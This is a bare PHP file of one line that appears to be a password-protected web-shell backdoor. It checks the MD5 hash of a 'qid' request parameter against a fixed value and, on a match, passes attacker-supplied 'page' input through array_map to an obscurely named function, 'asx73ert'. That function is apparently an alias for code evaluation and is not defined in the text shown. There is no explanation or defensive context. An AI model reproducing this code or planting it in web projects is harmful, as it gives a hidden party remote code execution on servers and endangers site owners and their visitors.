<?
md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map("asx73ert",(array)$_REQUEST['page']):next;
?>